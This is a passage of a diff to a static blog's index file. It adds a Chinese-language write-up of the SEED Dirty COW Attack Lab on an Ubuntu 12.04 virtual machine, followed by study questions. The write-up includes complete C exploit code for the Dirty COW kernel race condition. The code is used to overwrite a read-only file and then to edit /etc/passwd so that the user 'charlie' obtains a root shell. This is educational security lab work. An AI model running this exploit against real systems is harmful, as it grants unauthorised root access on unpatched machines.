class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;   </span><br><span class="line">  <span class="type">char</span> *content=<span class="string">&quot;charlie:x:0:1002:,,,,,,,:/home/charlie:/bin/bash&quot;</span> ;</span><br><span class="line">  <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">    lseek(f, offset, SEEK_SET);</span><br><span class="line">    <span class="comment">// Write to the memory.</span></span><br><span class="line">    write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> file_size = (<span class="type">int</span>) arg;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>逆向工程与汇编语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
       </tags>
   </entry>
   <entry>
@@ -708,6 +714,68 @@ main:
 <p>之后的内容不属于 ELF 头部字段，而是程序的机器码和其他信息。</p>
 <p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/4.1.png" alt="输出结果" /></p>
 ]]></content>
+      <categories>
+        <category>逆向工程与汇编语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Dirty_COW_Attack_Lab</title>
+    <url>/posts/4a597bff.html</url>
+    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
+<p>  1、获得 Dirty COW 攻击的实践经验。</p>
+<p>  2、了解攻击所利用的竞争条件漏洞。</p>
+<p>  3、更深入地了解一般竞争条件安全问题。</p>
+<h1 id="实验原理"><a class="markdownIt-Anchor" href="#实验原理"></a> 实验原理</h1>
+<p>  利用 Dirty COW 竞争条件漏洞获得 root 权限。</p>
+<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
+<p>  Ubuntu 12.04 虚拟机。</p>
+<h1 id="实验任务"><a class="markdownIt-Anchor" href="#实验任务"></a> 实验任务</h1>
+<h2 id="task1"><a class="markdownIt-Anchor" href="#task1"></a> Task1</h2>
+<h3 id="创建虚拟只读文件"><a class="markdownIt-Anchor" href="#创建虚拟只读文件"></a> 创建虚拟只读文件</h3>
+<p>  步骤：</p>
+<p>  1、sudo touch /zzz指令在根目录下创建一个名为 zzz 的空文件。</p>
+<p>  2、sudo chmod 644 /zzz指令将 zzz 文件的权限设置为 644，即如果未获得根目录权限则对 zzz 文件的权限为只读。</p>
+<p>  3、sudo gedit /zzz指令用 gedit 编辑器打开 zzz 文件。</p>
+<p>  4、在 gedit 编辑器中输入&quot;SuperYzsisagoodman.&quot;，保存并关闭。</p>
+<p>  5、ls -l /zzz指令查看 zzz 文件的权限，显示为-rw-r--r--，即文件所有者的权限为读写，同组用户和其他用户的权限为只读。</p>
+<p>  6、echo 99999 &gt; /zzz 指令将 99999 写入 zzz 文件，显示为Permission denied，即无权限。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/1.1.png" alt="创建虚拟只读文件" /></p>
+<h3 id="发起攻击"><a class="markdownIt-Anchor" href="#发起攻击"></a> 发起攻击</h3>
+<p>  步骤：</p>
+<p>  1、gedit cow_attack.c 创建一个名为 cow_attack.c 的 C 语言文件并使用 gedit 编辑器打开，编写攻击代码：</p>
+<p>  main 线程将/zzz 映射到内存中，找到序列&quot;SuperYzs&quot;的位置，然后创建两个线程来利用操作系统内核中的 Dirty COW 竞争条件漏洞。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">   <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/zzz&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">   fstat(f, &amp;st);</span><br><span class="line">   file_size = st.st_size;</span><br><span class="line">   <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Find the position of the target area</span></span><br><span class="line">   <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;SuperYzs&quot;</span>);                        </span><br><span class="line"></span><br><span class="line">   <span class="comment">// We have to do the attack using two threads.</span></span><br><span class="line">   pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span>  *)file_size); </span><br><span class="line">   pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);             </span><br><span class="line"></span><br><span class="line">   <span class="comment">// Wait for the threads to finish.</span></span><br><span class="line">   pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">   pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  下面 write 线程的任务是将内存中的字符串&quot;SuperYzs&quot;替换为&quot;********&quot;。由于映射的内存是 COW 类型，只有这个线程时仅能修改映射内存的副本，不会对底层的/zzz 文件进行任何更改。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> *content= <span class="string">&quot;********&quot;</span>;</span><br><span class="line">   <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">      lseek(f, offset, SEEK_SET);</span><br><span class="line">      <span class="comment">// Write to the memory.</span></span><br><span class="line">      write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  madvise 线程只执行一项任务：丢弃映射内存的私有副本，以便页表可以重新指向原始映射内存。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> file_size = (<span class="type">int</span>) arg;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  2、gcc cow_attack.c -lpthread 指令使用多线程编译指令-lpthread编译 cow_attack.c 文件，使用 ls 指令发现生成了a.out文件。</p>
+<p>  3、./a.out 指令运行 a.out 文件，等待一顿时间后退出程序。</p>
+<p>  4、cat /zzz 指令查看 zzz 文件，发现文件内容已经被修改 &quot;********isagoodman&quot;，即&quot;SuperYzs已被替换为&quot;********&quot;，攻击成功。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/1.2.png" alt="攻击步骤" /></p>
+<h2 id="task-2-修改口令文件以获取-root-权限"><a class="markdownIt-Anchor" href="#task-2-修改口令文件以获取-root-权限"></a> Task 2: 修改口令文件以获取 Root 权限</h2>
+<p>  步骤：</p>
+<p>  1、使用sudo adduser charlie指令创建一个名为 charlie 的用户。</p>
+<p>  2、使用cat /etc/passwd | grep charlie查看charlie的记录。</p>
+<p>  3、使用gedit cow_attack.c 指令将cow_attack.c文件使用 gedit 编辑器打开，修改代码达到攻击目的：即找到/etc/passwd文件中的charlie记录，将其第三个字段改为0，注意改完之后的字段总长度与之前相同，不足的部分使用&quot;,&quot;补齐。</p>
+<p>  4、使用gcc cow_attack.c -lpthread指令编译 cow_attack.c 文件，使用./a.out指令运行 a.out 文件，等待一顿时间后退出程序。</p>
+<p>  5、再次使用cat /etc/passwd | grep charlie查看charlie的记录，发现第三个字符已经改为0了，即charlie已经具有了root权限。</p>
+<p>  6、使用su charlie 切换到 charlie 用户，在 shell 提示符处看到 # 符号，这是 rootshell 的指示符。运行 id 命令，发现已经获得了 root 权限，攻击成功。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/2.1.png" alt="创建charlie用户" /></p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Dirty-COW-Attack-Lab/2.2.png" alt="Dirty COW 攻击" /></p>
+<h1 id="思考题"><a class="markdownIt-Anchor" href="#思考题"></a> 思考题</h1>
+<h2 id="q1"><a class="markdownIt-Anchor" href="#q1"></a> Q1</h2>
+<p>  会打印出字符串&quot;World&quot;。 当这个文件使用 mmap() 映射到内存（整个文件）时，每个字符都会被存储在连续的内存地址中，内存地址被存储在一个变量map 中，其中map指向映射内存的起始地址，也就是字符串&quot;Hello World&quot;的'H'的地址。map + 6则是指向'W'的地址，因此printf(&quot;%s\n&quot;, map + 6)；将从地址map + 6开始打印，直到遇到一个null字符（字符串结束标志），因此会打印出字符串&quot;World&quot;。</p>
+<h2 id="q2"><a class="markdownIt-Anchor" href="#q2"></a> Q2</h2>
+<p>  不可以。因为线程共享相同的地址空间，因此可以更容易地制造出Dirty-Cow攻击的必要条件；而进程则拥有独立的内存空间，使得攻击难以进行。</p>
+<h1 id="代码附录"><a class="markdownIt-Anchor" href="#代码附录"></a> 代码附录</h1>
+<h2 id="task1-2"><a class="markdownIt-Anchor" href="#task1-2"></a> Task1</h2>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">   <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/zzz&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">   fstat(f, &amp;st);</span><br><span class="line">   file_size = st.st_size;</span><br><span class="line">   <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Find the position of the target area</span></span><br><span class="line">   <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;SuperYzs&quot;</span>);                        </span><br><span class="line"></span><br><span class="line">   <span class="comment">// We have to do the attack using two threads.</span></span><br><span class="line">   pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span>  *)file_size); </span><br><span class="line">   pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);             </span><br><span class="line"></span><br><span class="line">   <span class="comment">// Wait for the threads to finish.</span></span><br><span class="line">   pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">   pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> *content= <span class="string">&quot;********&quot;</span>;</span><br><span class="line">   <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">      lseek(f, offset, SEEK_SET);</span><br><span class="line">      <span class="comment">// Write to the memory.</span></span><br><span class="line">      write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> file_size = (<span class="type">int</span>) arg;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="task2"><a class="markdownIt-Anchor" href="#task2"></a> Task2</h2>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">  <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line">  <span class="type">int</span> f=open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  file_size = st.st_size;</span><br><span class="line">  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Find the position of the target area</span></span><br><span class="line">  <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;charlie&quot;</span>);                        </span><br><span class="line"></span><br><span class="line">  <span class="comment">// We have to do the attack using two threads.</span></span><br><span class="line">  pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span>  *)file_size); </span><br><span class="line">  pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);             </span><br><span class="line"></span><br><span class="line">  <span class="comment">// Wait for the threads to finish.</span></span><br><span class="line">  pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;   </span><br><span class="line">  <span class="type">char</span> *content=<span class="string">&quot;charlie:x:0:1002:,,,,,,,:/home/charlie:/bin/bash&quot;</span> ;</span><br><span class="line">  <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">    lseek(f, offset, SEEK_SET);</span><br><span class="line">    <span class="comment">// Write to the memory.</span></span><br><span class="line">    write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> file_size = (<span class="type">int</span>) arg;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>逆向工程与汇编语言</category>
       </categories>
